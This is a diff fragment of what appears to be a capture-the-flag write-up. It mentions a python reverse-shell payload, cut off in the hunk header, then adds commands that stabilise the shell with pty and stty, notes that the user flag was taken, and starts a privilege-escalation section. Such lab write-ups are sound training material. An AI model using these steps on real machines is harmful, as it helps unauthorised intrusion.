@@ -481,11 +481,27 @@ I got my reverse shell using this python payload ```python3 -c 'import socket,su
 
 We are in, 
 
+Lets stabilize this shell
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=screen
+```
+
+`26`
+
+Lets grab the flag in the ```home``` directory
+
+`27`
+
+We got our user flag
+
+To get the root flag, we'll have to escalate our privileges
 
 
-
-
-
+## Privilege Escalation (10.8.0.2)
 
 
 
